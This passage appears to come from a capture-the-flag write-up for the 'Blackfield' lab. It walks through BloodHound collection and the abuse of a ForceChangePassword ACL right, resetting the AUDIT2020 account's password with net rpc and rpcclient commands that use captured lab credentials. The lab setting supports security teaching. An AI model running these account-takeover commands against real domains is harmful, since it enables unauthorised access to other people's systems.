```bash
bloodhound-python -d BLACKFIELD.local -u 'support' -p '#00^BlackKnight' -ns 10.129.229.17 -c All --zip
```

![](<attachments/Pasted image 20260107153556.png>)

## 1. ACL Analysis with BloodHound

After obtaining credentials for `support`, we import the collected data into BloodHound and mark the user as **Owned**.  
When reviewing **Outbound Object Control**, we find a direct relationship over the user `AUDIT2020`.

![](<attachments/Pasted image 20260107153639.png>)
![](<attachments/Pasted image 20260107153951.png>)

- **Source:** `SUPPORT@BLACKFIELD.LOCAL` (controlled)
- **Target:** `AUDIT2020@BLACKFIELD.LOCAL` (victim)
- **Privilege / Edge:** `ForceChangePassword`

**Analysis:** This extended right (ACE) allows us to reset the target user’s password **without knowing the current password**.

---

## 2. Exploitation Guide (Built-in Help)

BloodHound not only shows the path, but also **how to execute it**.  
By right-clicking the relationship (`ForceChangePassword`) and checking the built-in help, we get Linux-ready commands.

![](<attachments/Pasted image 20260107154205.png>)

The tool suggests using `net rpc`, although we can also use `rpcclient` as a manual alternative.

### Abuse Commands

We can use either of the following options to change `audit2020`'s password:

**Option A: BloodHound suggestion (one-liner)**  
This is the syntax shown in the screenshot:

```bash
# Syntax: net rpc password "Target" "NewPass" -U "Domain"/"User"%"Pass" -S "DC_IP"
net rpc password "audit2020" "H@CKTHEBOX#" -U "BLACKFIELD"/"support"%"#00^BlackKnight" -S "10.10.10.192"
```

**Option B: Manual method (rpcclient)**  
This is the method we used earlier:

```bash
rpcclient -U blackfield/support 10.10.10.192
# Once inside the interactive shell:
# 23 is the info level used to set a password
> setuserinfo audit2020 23 'H@CKTHEBOX#'
```

![](<attachments/Pasted image 20260107160153.png>)

Now we try Option A again (the one BloodHound recommended), and we successfully change it:

```bash
net rpc password "audit2020" "newP@ssword2022" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "DC01.BLACKFIELD.local"
```
